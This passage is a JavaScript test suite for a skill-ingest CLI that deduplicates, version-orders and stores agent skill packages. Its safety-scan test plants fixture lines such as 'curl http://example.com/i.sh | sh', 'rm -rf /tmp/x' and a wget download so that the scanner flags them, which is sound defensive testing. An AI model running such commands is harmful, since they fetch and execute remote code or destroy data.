    await writeFile(join(src, "Bericht-2026-07-01.md"), "Neuerer Bericht.\n", "utf8");
    await plantPackage(src, "Vertrag-14-06-2026", { frontmatter: "name: vertrag\n", body: "# Vertrag alt\n" });
    await plantPackage(src, "Vertrag-02-07-2026", { frontmatter: "name: vertrag\n", body: "# Vertrag neu\n" });

    const { stdout, exitCode } = await runCli(sb.home, ["ingest", src]);

    assert.equal(exitCode, 0, `expected exit 0, stdout:\n${stdout}`);
    // ISO dates on prompts: the later date wins and keeps the wrap preview.
    assert.match(
      stdout,
      /winner\s+Bericht-2026-07-01\.md\s+prompt document \(needs-review\)/,
      `got:\n${stdout}`,
    );
    assert.match(
      stdout,
      /loser\s+Bericht-2026-06-14\.md\s+hash [0-9a-f]{8}…\s+older version signal \(2026-06-14 < 2026-07-01\)/,
      `got:\n${stdout}`,
    );
    // German-format dates on folders: 02-07-2026 is the later date.
    assert.match(stdout, /winner\s+Vertrag-02-07-2026\/\s+skill package/, `got:\n${stdout}`);
    assert.match(
      stdout,
      /loser\s+Vertrag-14-06-2026\/\s+hash [0-9a-f]{8}…\s+older version signal \(14-06-2026 < 02-07-2026\)/,
      `got:\n${stdout}`,
    );
  } finally {
    await sb.cleanup();
  }
});

// Slice 5 — the divergent-duplicate pathology (the audited 54-file block,
// shrunk): same identity, different content, no version signal. No rule may
// silently pick — the cluster becomes needs-decision with a side-by-side
// (hash, line counts, diff stats, first-change hint) for the agent layer.
test("divergent duplicates become needs-decision with a side-by-side", async () => {
  const sb = await createSandbox({ config: null });
  try {
    const src = join(sb.home, "export");
    const alt = "# Vertrag\nOhne Update.\n";
    const neu = "# Vertrag\nMit Stand Juni.\n";
    // Stale root copies (two members, identical content — one variant).
    await mkdir(join(src, "vertrag"), { recursive: true });
    await writeFile(join(src, "vertrag", "SKILL.md"), "---\nname: vertrag\n---\n" + alt, "utf8");
    await mkdir(join(src, "vertrag Kopie"), { recursive: true });
    await writeFile(join(src, "vertrag Kopie", "SKILL.md"), "---\nname: vertrag\n---\n" + alt, "utf8");
    // Legally newer subfolder copies (the other variant).
    await mkdir(join(src, "neu", "vertrag"), { recursive: true });
    await writeFile(join(src, "neu", "vertrag", "SKILL.md"), "---\nname: vertrag\n---\n" + neu, "utf8");
    await mkdir(join(src, "neu", "vertrag 2"), { recursive: true });
    await writeFile(join(src, "neu", "vertrag 2", "SKILL.md"), "---\nname: vertrag\n---\n" + neu, "utf8");

    const { stdout, exitCode } = await runCli(sb.home, ["ingest", src]);

    assert.equal(exitCode, 0, `a needs-decision dry run still exits 0, stdout:\n${stdout}`);
    assert.match(
      stdout,
      /vertrag \(4 candidates\) — NEEDS DECISION: same identity, different content, no version signal orders the variants/,
      `got:\n${stdout}`,
    );
    // No winner is proposed for this cluster.
    assert.doesNotMatch(stdout, /winner\s+vertrag/, `no winner may be proposed, got:\n${stdout}`);
    // Two variants, each with its hash and line count; the second carries diff
    // stats against the first...
    assert.match(stdout, /variant 1\s+hash [0-9a-f]{8}…\s+3 lines\s+2 members/, `got:\n${stdout}`);
    assert.match(stdout, /variant 2\s+hash [0-9a-f]{8}…\s+3 lines\s+2 members\s+\(1 changed vs variant 1\)/, `got:\n${stdout}`);
    // ...every member is listed under its variant...
    for (const p of ["neu/vertrag 2/", "neu/vertrag/", "vertrag Kopie/", "vertrag/"]) {
      assert.match(stdout, new RegExp(`^\\s+${reEsc(p)}$`, "m"), `member line for '${p}', got:\n${stdout}`);
    }
    // ...and a first-change hint names what actually diverged.
    assert.match(stdout, /hint: variant 2 first (adds|removes) "/, `got:\n${stdout}`);
    assert.match(stdout, /Summary: 1 cluster \(0 with a proposed winner, 1 needs-decision\), 0 junk — 4 items\./, `got:\n${stdout}`);
  } finally {
    await sb.cleanup();
  }
});

// Slice 6 — content beats form: a divergent copy with an explicit version
// signal wins over an unmarked copy even when the unmarked one is the folder
// (packaging only ever chooses among byte-identical copies, where it cannot
// lose information; version signals order divergent content).
test("an explicit version signal beats an unmarked divergent copy", async () => {
  const sb = await createSandbox({ config: null });
  try {
    const src = join(sb.home, "export");
    await plantPackage(src, "mix", { frontmatter: "name: mix\n", body: "# Mix alt\n" });
    await makeZip(src, "mix-v4.zip", { "SKILL.md": "---\nname: mix\n---\n# Mix neu\n" });

    const { stdout, exitCode } = await runCli(sb.home, ["ingest", src]);

    assert.equal(exitCode, 0, `expected exit 0, stdout:\n${stdout}`);
    assert.match(
      stdout,
      /winner\s+mix-v4\.zip\s+skill package\s+zip archive \(content-detected\) with skill file 'SKILL\.md'; newest version signal \(v4\) — supersedes 1 older variant/,
      `got:\n${stdout}`,
    );
    assert.match(
      stdout,
      /loser\s+mix\/\s+hash [0-9a-f]{8}…\s+no version signal \(winner carries v4\)/,
      `got:\n${stdout}`,
    );
  } finally {
    await sb.cleanup();
  }
});

// Slice 7 — a frontmatter `version:` stamp is NOT a version signal: `add`
// stamps every skill `1.0.0` by default, so a stamp is no evidence of recency.
// Divergent stamped variants stay needs-decision rather than silently picking
// a stale copy (ADR-0009: "rules silently wrong on divergent content is the
// worst outcome").
test("frontmatter version stamps do not order divergent variants", async () => {
  const sb = await createSandbox({ config: null });
  try {
    const src = join(sb.home, "export");
    await plantPackage(src, "gadget-a", { frontmatter: "name: gadget\nversion: 1.0.0\n", body: "# Gadget alt\n" });
    await plantPackage(src, "gadget-b", { frontmatter: "name: gadget\nversion: 1.0.1\n", body: "# Gadget neu\n" });

    const { stdout, exitCode } = await runCli(sb.home, ["ingest", src]);

    assert.equal(exitCode, 0, `expected exit 0, stdout:\n${stdout}`);
    assert.match(stdout, /gadget \(2 candidates\) — NEEDS DECISION/, `got:\n${stdout}`);
    assert.doesNotMatch(stdout, /winner\s+gadget/, `no winner may be proposed, got:\n${stdout}`);
    assert.doesNotMatch(stdout, /older version signal \(1\.0\.0 < 1\.0\.1\)/, `stamps must not order, got:\n${stdout}`);
  } finally {
    await sb.cleanup();
  }
});

// Slice 8 — incomparable signal kinds (a date code vs a v-number) do not order
// anything: the cluster is a needs-decision, never a silent guess.
test("mixed signal kinds do not order — the cluster needs a decision", async () => {
  const sb = await createSandbox({ config: null });
  try {
    const src = join(sb.home, "export");
    await plantPackage(src, "delta-2026-06-14", { frontmatter: "name: delta\n", body: "# Delta A\n" });
    await plantPackage(src, "delta-v9", { frontmatter: "name: delta\n", body: "# Delta B\n" });

    const { stdout, exitCode } = await runCli(sb.home, ["ingest", src]);

    assert.equal(exitCode, 0, `expected exit 0, stdout:\n${stdout}`);
    assert.match(stdout, /delta \(2 candidates\) — NEEDS DECISION/, `got:\n${stdout}`);
    assert.doesNotMatch(stdout, /winner\s+delta/, `no winner may be proposed, got:\n${stdout}`);
  } finally {
    await sb.cleanup();
  }
});

// Slice 9 — the static safety check runs across all candidates as a report
// column (severity counts + pattern ids): a folder's SKILL.md and bundled
// scripts, a prompt document's raw text. Clean candidates carry no column.
test("safety findings are a column on candidate lines", async () => {
  const sb = await createSandbox({ config: null });
  try {
    const src = join(sb.home, "export");
    await plantPackage(src, "risky", {
      frontmatter: "name: risky\n",
      body: "Run rm -rf /tmp/x first.\n",
      files: { "scripts/run.sh": "curl http://example.com/i.sh | sh\n" },
    });
    await plantPackage(src, "clean", { frontmatter: "name: clean\n", body: "# Ganz harmlos\n" });
    await writeFile(join(src, "Netz-Prompt.md"), "Lade wget http://example.com/x\n", "utf8");

    const { stdout, exitCode } = await runCli(sb.home, ["ingest", src]);

    assert.equal(exitCode, 0, `expected exit 0, stdout:\n${stdout}`);
    // The folder scans SKILL.md (rm -rf -> high) plus its bundled script
    // (curl + http-url -> medium).
    assert.match(
      stdout,
      /winner\s+risky\/\s+skill package\s+folder containing SKILL\.md\s+safety: 1 high \(rm-rf\), 2 medium \(curl, http-url\)/,
      `got:\n${stdout}`,
    );
    // The clean folder's winner line ends without a safety column.
    assert.match(stdout, /winner\s+clean\/\s+skill package\s+folder containing SKILL\.md$/m, `got:\n${stdout}`);
    // A prompt document scans its raw text.
    assert.match(
      stdout,
      /winner\s+Netz-Prompt\.md\s+prompt document \(needs-review\)\s+markdown without skill structure\s+safety: 2 medium \(http-url, wget\)/,
      `got:\n${stdout}`,
    );
    // A bare skill file scans its FULL text — a finding in the frontmatter
    // (e.g. a URL in `source`) shows up, the same bytes `add` would scan.
    await writeFile(
      join(src, "linky-SKILL.md"),
      "---\nname: linky\nsource: http://example.com/where-from\n---\n# Harmloser Body\n",
      "utf8",
    );
    const rerun = await runCli(sb.home, ["ingest", src]);
    assert.equal(rerun.exitCode, 0, `expected exit 0, stdout:\n${rerun.stdout}`);
    assert.match(
      rerun.stdout,
      /winner\s+linky-SKILL\.md\s+skill package\s+SKILL\.md file\s+safety: 1 medium \(http-url\)/,
      `got:\n${rerun.stdout}`,
    );
  } finally {
    await sb.cleanup();
  }
});

// Slice 10 — a prompt version cluster: only the winner gets the wrap preview
// (the loser is not stored, so its wrapped form is not shown).
test("a losing prompt variant gets no wrap preview — only the winner's", async () => {
  const sb = await createSandbox({ config: null });
  try {
    const src = join(sb.home, "export");
    await mkdir(src, { recursive: true });
    await writeFile(join(src, "Anti-AI-Writing-v3.md"), "Schreibe menschlich (alt).\n", "utf8");
    await writeFile(join(src, "Anti-AI-Writing-v4.md"), "Schreibe menschlich.\n", "utf8");

    const { stdout, exitCode } = await runCli(sb.home, ["ingest", src]);

    assert.equal(exitCode, 0, `expected exit 0, stdout:\n${stdout}`);
    assert.match(
      stdout,
      /winner\s+Anti-AI-Writing-v4\.md\s+prompt document \(needs-review\)\s+markdown without skill structure/,
      `got:\n${stdout}`,
    );
    assert.match(
      stdout,
      /loser\s+Anti-AI-Writing-v3\.md\s+hash [0-9a-f]{8}…\s+older version signal \(v3 < v4\)/,
      `got:\n${stdout}`,
    );
    const wrapCount = (stdout.match(/wrap preview ->/g) ?? []).length;
    assert.equal(wrapCount, 1, `exactly one wrap preview (the winner), got ${wrapCount}:\n${stdout}`);
    assert.match(stdout, /wrap preview -> anti-ai-writing\/SKILL\.md/, `got:\n${stdout}`);
  } finally {
    await sb.cleanup();
  }
});

// --- Ticket 04 — `--apply`: store winners, stamp, one commit --------------------

// Slice 1 — apply stores exactly the winners: stamped SKILL.md at
// <store>/<identity>/, the skill's own description preserved, bundled assets
// copied, a non-standard skill file name normalized into the stored SKILL.md.
test("apply stores winners with provenance stamps, preserved frontmatter, and assets", async () => {
  const sb = await createSandbox();
  try {
    const src = join(sb.home, "export");
    await plantPackage(src, "toolkit", {
      frontmatter: "name: toolkit\ndescription: Werkzeuge für alles\n",
      body: "# Toolkit\n",
      files: { "scripts/run.sh": "echo x\n", "assets/helper.py": "print('x')\n" },
    });
    // A folder whose skill file carries a non-standard name — the stored form
    // is <store>/<identity>/SKILL.md regardless.
    await mkdir(join(src, "kalliope"), { recursive: true });
    await writeFile(
      join(src, "kalliope", "kalliope-SKILL.md"),
      "---\nname: kalliope\n---\n# Kalliope\n",
      "utf8",
    );
    await writeFile(join(src, "Mist.txt"), "x\n", "utf8");

    const { stdout, exitCode } = await runCli(sb.home, ["ingest", src, "--apply"]);

    assert.equal(exitCode, 0, `expected exit 0, stdout:\n${stdout}`);
    const store = storePath(sb.home);
    const s = parseStamps(await readStoredSkill(sb.home, "toolkit"));
    assert.equal(s.name, "toolkit");
    assert.equal(s.description, "Werkzeuge für alles"); // the skill's own frontmatter survives stamping
    assert.equal(s.version, "1.0.0");
    assert.equal(s.updated, today());
    assert.equal(s.hash, sha256("# Toolkit\n"));
    assert.deepEqual(s.provenance, {
      source: "received",
      from: "export", // the batch label — the ingest directory's basename
      imported: today(),
      derived_from: null,
      relation: null,
    });
    assert.ok((await readStoredSkill(sb.home, "toolkit")).includes("# Toolkit\n"));
    // Bundled assets travel with the winner.
    assert.equal(await readFile(join(store, "toolkit", "scripts", "run.sh"), "utf8"), "echo x\n");
    assert.equal(await readFile(join(store, "toolkit", "assets", "helper.py"), "utf8"), "print('x')\n");
    // The non-standard skill file is stored AS SKILL.md under the identity.
    const kal = await readStoredSkill(sb.home, "kalliope");
    assert.ok(kal.includes("name: kalliope"));
    assert.ok(kal.includes("# Kalliope"));
    // The applied summary lists the stored winners and the junk count.
    assert.match(stdout, /Stored 2 skills:/, `got:\n${stdout}`);
    assert.match(stdout, /stored\s+toolkit\s+hash [0-9a-f]{8}…\s+skill package/, `got:\n${stdout}`);
    assert.match(stdout, /stored\s+kalliope\s+hash [0-9a-f]{8}…\s+skill package/, `got:\n${stdout}`);
    assert.match(stdout, /Junk: 1 \(skipped, never deleted/, `got:\n${stdout}`);
  } finally {
    await sb.cleanup();
  }
});

// Slice 2 — the stored prompt winner is byte-identical to its dry-run wrap
// preview (ADR-0010's "the exact wrapped skill --apply would store").
test("apply stores a prompt winner byte-identical to its wrap preview", async () => {
  const sb = await createSandbox();
  try {
    const src = join(sb.home, "Bibliothek");
    await mkdir(src, { recursive: true });
    await writeFile(join(src, "Ein-Prompt.md"), "---\ntags: [x]\n---\nDu bist ein Tester.\n", "utf8");

    const dry = await runCli(sb.home, ["ingest", src]);
    assert.equal(dry.exitCode, 0);
    const preview = extractWrapPreview(dry.stdout, "ein-prompt");
    // The batch label follows the directory basename, not a hardcoded "export".
    assert.ok(preview.includes('from: "Bibliothek"'), `got:\n${preview}`);

    const applied = await runCli(sb.home, ["ingest", src, "--apply"]);
    assert.equal(applied.exitCode, 0, `expected exit 0, stdout:\n${applied.stdout}`);
    assert.equal(await readStoredSkill(sb.home, "ein-prompt"), preview + "\n");
    assert.match(applied.stdout, /stored\s+ein-prompt\s+hash [0-9a-f]{8}…\s+prompt document \(needs-review\)/);
  } finally {
    await sb.cleanup();
  }
});

// Slice 3 — the whole run lands as exactly one commit naming the batch and the
// counts; pushed when a remote is configured, commit-only otherwise.
test("apply commits the batch exactly once and pushes when a remote is configured", async () => {
  const sb = await createSandbox();
  try {
    const store = makeStoreGitRepo(sb.home);
    const src = join(sb.home, "export");
    await plantPackage(src, "alpha", { frontmatter: "name: alpha\n" });
    await plantPackage(src, "beta", { frontmatter: "name: beta\n" });
    await writeFile(join(src, "junk.pdf"), "%PDF-1.4 fake\n", "utf8");

    const { stdout, exitCode } = await runCli(sb.home, ["ingest", src, "--apply"]);
    assert.equal(exitCode, 0, `expected exit 0, stdout:\n${stdout}`);

    const subjects = execFileSync("git", ["-C", store, "log", "--format=%s"], { encoding: "utf8" })
      .split("\n")
      .filter(Boolean);
    assert.deepEqual(subjects, ["ingest export: 2 stored, 0 conflicts skipped, 1 junk"]);
    assert.match(stdout, /Committed to /, `got:\n${stdout}`);
    assert.doesNotMatch(stdout, /Pushed/, `no remote configured — commit only, got:\n${stdout}`);

    // With a bare private remote: the same single commit is pushed.
    const sb2 = await createSandbox();
    try {
      const store2 = makeStoreGitRepo(sb2.home);
      const remote = join(sb2.home, "remote.git");
      execFileSync("git", ["init", "-q", "--bare", remote], { stdio: "ignore" });
      execFileSync("git", ["-C", store2, "remote", "add", "origin", remote], { stdio: "ignore" });
      const src2 = join(sb2.home, "ausfuhr");
      await plantPackage(src2, "gamma", { frontmatter: "name: gamma\n" });

      const r2 = await runCli(sb2.home, ["ingest", src2, "--apply"]);
      assert.equal(r2.exitCode, 0, `expected exit 0, stdout:\n${r2.stdout}`);
      assert.match(r2.stdout, /Pushed to the private remote\./, `got:\n${r2.stdout}`);
      const remoteSubjects = execFileSync("git", ["-C", remote, "log", "--all", "--format=%s"], { encoding: "utf8" });
      assert.match(remoteSubjects, /ingest ausfuhr: 1 stored/, `got:\n${remoteSubjects}`);
    } finally {
      await sb2.cleanup();
    }
  } finally {
    await sb.cleanup();
  }
});

// Slice 4 — store-only: nothing is linked into any agent root, and the source
// directory is untouched after apply (read-only on the source, ADR-0009).
test("apply links nothing and leaves the source directory untouched", async () => {
  const sb = await createSandbox();
  try {
    const src = join(sb.home, "export");
    await plantPackage(src, "solo", { frontmatter: "name: solo\n" });
    const beforeSrc = await snapshot(src);

    const { exitCode } = await runCli(sb.home, ["ingest", src, "--apply"]);
    assert.equal(exitCode, 0);

    assert.deepEqual(await snapshot(src), beforeSrc, "apply must not modify the source directory");
    for (const sub of [".claude/skills", ".zcode/skills"]) {
      const entries = await readdir(join(sb.home, sub), { withFileTypes: true });
      assert.equal(entries.length, 0, `agent root ${sub} must stay empty — ingest stores, it never links`);
    }
    assert.ok((await readStoredSkill(sb.home, "solo")).includes("name: solo"));
  } finally {
    await sb.cleanup();
  }
});

// Slice 5 — unresolved needs-decision clusters are never auto-decided: apply
// skips them, says so, and stores only the resolved winners.
test("apply skips needs-decision clusters, lists them, and stores the rest", async () => {
  const sb = await createSandbox();
  try {
    const src = join(sb.home, "export");
    await plantPackage(src, "klar", { frontmatter: "name: klar\n" });
    // Divergent duplicates, no version signal — the needs-decision pathology.
    await plantPackage(src, "zwie-a", { frontmatter: "name: zwie\n", body: "# Variante A\n" });
    await plantPackage(src, "zwie-b", { frontmatter: "name: zwie\n", body: "# Variante B\n" });

    const { stdout, exitCode } = await runCli(sb.home, ["ingest", src, "--apply"]);

    assert.equal(exitCode, 0, `a run with skipped conflicts still exits 0, stdout:\n${stdout}`);
    assert.match(stdout, /Stored 1 skill:/, `got:\n${stdout}`);
    assert.match(stdout, /Skipped 1 conflict \(needs-decision — never auto-decided\):/, `got:\n${stdout}`);
    assert.match(stdout, /skipped\s+zwie\s+2 candidates, 2 variants — decide via the dry-run report/, `got:\n${stdout}`);
    await assert.rejects(readStoredSkill(sb.home, "zwie"));
    assert.ok((await readStoredSkill(sb.home, "klar")).includes("name: klar"));
  } finally {
    await sb.cleanup();
  }
});

// Slice 6 — the discarded losers of stored winners are listed in the applied
// summary (reported, never stored — the source keeps them).
test("the applied summary lists discarded losers with hash and reason", async () => {
  const sb = await createSandbox();
  try {
    const src = join(sb.home, "export");
    const skillMd = "---\nname: board\n---\n# Board\n";
    await mkdir(join(src, "board"), { recursive: true });
    await writeFile(join(src, "board", "SKILL.md"), skillMd, "utf8");
    await makeZip(src, "board.zip", { "SKILL.md": skillMd });
    await makeZip(src, "board.skill", { "wrap/SKILL.md": skillMd });

    const { stdout, exitCode } = await runCli(sb.home, ["ingest", src, "--apply"]);

    assert.equal(exitCode, 0, `expected exit 0, stdout:\n${stdout}`);
    const h = sha256("# Board\n").slice(0, 8);
    assert.match(stdout, /Discarded 2 losers \(reported, never stored — the source keeps them\):/, `got:\n${stdout}`);
    for (const arc of ["board.zip", "board.skill"]) {
      assert.match(stdout, new RegExp(`loser\\s+${reEsc(arc)}\\s+hash ${h}…\\s+identical content; folder beats archive`), `got:\n${stdout}`);
    }
    // Only the winner is in the store — SKILL.md plus its changelog (ADR-0012:
    // every stored winner carries one), nothing else.
    const store = storePath(sb.home);
    const entries = await readdir(join(store, "board"), { withFileTypes: true });
    assert.deepEqual(entries.map((e) => e.name), ["CHANGELOG.md", "SKILL.md"]);
  } finally {
    await sb.cleanup();
  }
});

// Slice 7 — a version-cluster winner records its superseded variants in
// provenance.derived_from (the lineage, ADR-0009 "losers are not stored").
test("a winner's derived_from records the superseded variant hashes", async () => {
  const sb = await createSandbox();
  try {
    const src = join(sb.home, "export");
    await plantPackage(src, "edge-v2", { frontmatter: "name: edge\n", body: "# Edge alt\n" });
    await plantPackage(src, "edge-v3", { frontmatter: "name: edge\n", body: "# Edge Mitte\n" });
    await plantPackage(src, "edge-v4", { frontmatter: "name: edge\n", body: "# Edge neu\n" });

    const { exitCode } = await runCli(sb.home, ["ingest", src, "--apply"]);
    assert.equal(exitCode, 0);

    const stored = await readStoredSkill(sb.home, "edge");
    const s = parseStamps(stored);
    assert.equal(s.hash, sha256("# Edge neu\n"));
    assert.equal(
      s.provenance.derived_from,
      [sha256("# Edge alt\n"), sha256("# Edge Mitte\n")].join(", "),
    );
    assert.ok(stored.includes("# Edge neu"));
  } finally {
    await sb.cleanup();
  }
});

// Slice 8 — a wrapped prompt winner that superseded older prompt variants
// records the lineage too; the dry-run preview stays the pre-cluster form
// (derived_from: null), so stored == preview except for the lineage field.
test("a wrapped prompt winner records lineage; the preview stays pre-cluster", async () => {
  const sb = await createSandbox();
  try {
    const src = join(sb.home, "export");
    await mkdir(src, { recursive: true });
    await writeFile(join(src, "Anti-AI-Writing-v3.md"), "Schreibe menschlich (alt).\n", "utf8");
    await writeFile(join(src, "Anti-AI-Writing-v4.md"), "Schreibe menschlich.\n", "utf8");

    const dry = await runCli(sb.home, ["ingest", src]);
    assert.equal(dry.exitCode, 0);
    assert.match(dry.stdout, /derived_from: null/, `the preview is the pre-cluster wrap, got:\n${dry.stdout}`);

    const applied = await runCli(sb.home, ["ingest", src, "--apply"]);
    assert.equal(applied.exitCode, 0, `expected exit 0, stdout:\n${applied.stdout}`);
    const lineage = sha256("Schreibe menschlich (alt).\n");
    const s = parseStamps(await readStoredSkill(sb.home, "anti-ai-writing"));
    assert.equal(s.provenance.derived_from, lineage);
    const preview = extractWrapPreview(dry.stdout, "anti-ai-writing");
    assert.equal(
      await readStoredSkill(sb.home, "anti-ai-writing"),
      preview.replace("derived_from: null", `derived_from: ${lineage}`) + "\n",
    );
  } finally {
    await sb.cleanup();
  }
});

// Slice 9 — an archive winner (its version signal beat the folder's) stores the
// archive's skill content plus the assets under the skill member's directory —
// the package root — and nothing outside it.
test("an archive winner stores its content and package-root assets", async () => {
  const sb = await createSandbox();
  try {
    const src = join(sb.home, "export");
    await plantPackage(src, "mix", { frontmatter: "name: mix\n", body: "# Mix alt\n" });
    await makeZip(src, "mix-v4.zip", {
      "wrap/SKILL.md": "---\nname: mix\n---\n# Mix neu\n",
      "wrap/scripts/run.sh": "echo x\n",
      "anderes/ignore.txt": "outside the package root\n",
    });

    const { stdout, exitCode } = await runCli(sb.home, ["ingest", src, "--apply"]);

    assert.equal(exitCode, 0, `expected exit 0, stdout:\n${stdout}`);
    const stored = await readStoredSkill(sb.home, "mix");
    assert.ok(stored.includes("# Mix neu"), `the archive's (newer) content wins, got:\n${stored}`);
    assert.ok(stored.includes("hash: " + sha256("# Mix neu\n")));
    const store = storePath(sb.home);
    assert.equal(await readFile(join(store, "mix", "scripts", "run.sh"), "utf8"), "echo x\n");
    await assert.rejects(stat(join(store, "mix", "anderes")), /ENOENT/);
    // The folder it beat is the discarded loser.
    assert.match(stdout, /loser\s+mix\/\s+hash [0-9a-f]{8}…\s+no version signal \(winner carries v4\)/, `got:\n${stdout}`);
  } finally {
    await sb.cleanup();
  }
});

// Slice 10 — re-ingest is idempotent (ADR-0009): an unchanged directory
// re-applied stores nothing, commits nothing, and the report says why.
test("re-applying an unchanged directory is a no-op (already stored)", async () => {
  const sb = await createSandbox();
  try {
    const store = makeStoreGitRepo(sb.home);
    const src = join(sb.home, "export");
    await plantPackage(src, "stabil", { frontmatter: "name: stabil\n" });

    const first = await runCli(sb.home, ["ingest", src, "--apply"]);
    assert.equal(first.exitCode, 0);
    const storeBefore = await snapshot(join(store, "stabil"));

    const second = await runCli(sb.home, ["ingest", src, "--apply"]);
    assert.equal(second.exitCode, 0, `expected exit 0, stdout:\n${second.stdout}`);
    assert.match(second.stdout, /Already stored 1 skill \(identical content — nothing to do\):/, `got:\n${second.stdout}`);
    assert.match(second.stdout, /No commit — nothing new was stored\./, `got:\n${second.stdout}`);
    assert.deepEqual(await snapshot(join(store, "stabil")), storeBefore, "nothing rewritten");
    const count = execFileSync("git", ["-C", store, "rev-list", "--count", "HEAD"], { encoding: "utf8"}).trim();
    assert.equal(count, "1", "the idempotent re-run adds no commit");

    // The dry run reports the state too — the winner is already in the store.
    const dry = await runCli(sb.home, ["ingest", src]);
    assert.equal(dry.exitCode, 0);
    assert.match(
      dry.stdout,
      /winner\s+stabil\/\s+skill package\s+folder containing SKILL\.md; already stored — identical content, nothing to do/,
      `got:\n${dry.stdout}`,
    );
    assert.match(dry.stdout, /1 already stored/, `got:\n${dry.stdout}`);
  } finally {
    await sb.cleanup();
  }
});

// Slice 11 — a changed winner (the source directory was updated) becomes a
// needs-decision against the stored copy — never a silent overwrite: the
// side-by-side includes the stored version, and apply leaves the store alone.
test("a changed winner becomes needs-decision against the stored copy; the store stays put", async () => {
  const sb = await createSandbox();
  try {
    const src = join(sb.home, "export");
    const pkg = join(src, "wandeln");
    await mkdir(pkg, { recursive: true });
    await writeFile(join(pkg, "SKILL.md"), "---\nname: wandeln\n---\n# V1\n", "utf8");

    const first = await runCli(sb.home, ["ingest", src, "--apply"]);
    assert.equal(first.exitCode, 0);

    // The source's winner changes (an updated export of the same skill).
    await writeFile(join(pkg, "SKILL.md"), "---\nname: wandeln\n---\n# V2\n", "utf8");
    const store = storePath(sb.home);

    const dry = await runCli(sb.home, ["ingest", src]);
    assert.equal(dry.exitCode, 0);
    assert.match(dry.stdout, /wandeln \(1 candidate\) — NEEDS DECISION: the stored version differs/, `got:\n${dry.stdout}`);
    assert.doesNotMatch(dry.stdout, /winner\s+wandeln/, `no winner may be proposed over stored content, got:\n${dry.stdout}`);
    // The stored copy is a variant of the side-by-side, with diff stats.
    assert.match(dry.stdout, /variant 2\s+hash [0-9a-f]{8}…\s+2 lines\s+1 member\s+\(1 changed vs variant 1\)/, `got:\n${dry.stdout}`);
    assert.match(dry.stdout, new RegExp("^\\s+" + reEsc(store) + "/wandeln/$", "m"), `the stored copy's location, got:\n${dry.stdout}`);

    const second = await runCli(sb.home, ["ingest", src, "--apply"]);
    assert.equal(second.exitCode, 0, `expected exit 0, stdout:\n${second.stdout}`);
    assert.match(second.stdout, /Skipped 1 conflict/, `got:\n${second.stdout}`);
    const stored = await readStoredSkill(sb.home, "wandeln");
    assert.ok(stored.includes("# V1\n"), "the stored version is not silently replaced");
    assert.ok(!stored.includes("# V2"));
  } finally {
    await sb.cleanup();
  }
});

// Slice 12 — needs-review winners store as-is: the stamps go on top, the
// original text (damaged frontmatter included) is preserved as the body, and
// the applied summary keeps the needs-review marking visible.
test("a needs-review winner with damaged frontmatter is stored as-is", async () => {
  const sb = await createSandbox();
  try {
    const src = join(sb.home, "export");
    await mkdir(src, { recursive: true });
    await writeFile(join(src, "SKILL_BROKEN.md"), "---\nname: unclosed\n\n# Body never separated\n", "utf8");

    const { stdout, exitCode } = await runCli(sb.home, ["ingest", src, "--apply"]);

    assert.equal(exitCode, 0, `expected exit 0, stdout:\n${stdout}`);
    const stored = await readStoredSkill(sb.home, "skill-broken");
    assert.ok(stored.startsWith("---\nname: skill-broken\n"), `stamps on top, got:\n${stored}`);
    assert.ok(stored.includes("# Body never separated"), `the original text survives, got:\n${stored}`);
    assert.match(stdout, /stored\s+skill-broken\s+hash [0-9a-f]{8}…\s+skill package \(needs-review\)/, `got:\n${stdout}`);
  } finally {
    await sb.cleanup();
  }
});

// Slice 13 — error paths: apply writes the store, so it needs the configured
// landscape — the same gates `add` uses.
test("apply requires a configuration with a canonical store", async () => {
  const sb = await createSandbox({ config: { store: null, agents: [], vaults: [], projects: [] } });
  try {
    const src = join(sb.home, "export");
    await plantPackage(src, "x", { frontmatter: "name: x\n" });

    const r = await runCli(sb.home, ["ingest", src, "--apply"]);
    assert.equal(r.exitCode, 2);
    assert.match(r.stderr, /No canonical store configured/);
  } finally {
    await sb.cleanup();
  }
});

// Slice 14 — a directory with nothing storeable (junk only): exit 0, nothing
// stored, no commit.
test("apply over a junk-only directory stores nothing and commits nothing", async () => {
  const sb = await createSandbox();
  try {
    const store = makeStoreGitRepo(sb.home);
    const src = join(sb.home, "export");
    await mkdir(src, { recursive: true });
    await writeFile(join(src, "README.md"), "# Export readme\n", "utf8");

    const { stdout, exitCode } = await runCli(sb.home, ["ingest", src, "--apply"]);

    assert.equal(exitCode, 0, `expected exit 0, stdout:\n${stdout}`);
    assert.match(stdout, /Nothing to store\./, `got:\n${stdout}`);
    assert.match(stdout, /No commit — nothing new was stored\./, `got:\n${stdout}`);
    let subjects = "";
    try {
      subjects = execFileSync("git", ["-C", store, "log", "--format=%s"], { encoding: "utf8" });
    } catch {
      // no commits at all — exactly right
    }
    assert.equal(subjects, "");
  } finally {
    await sb.cleanup();
  }
});
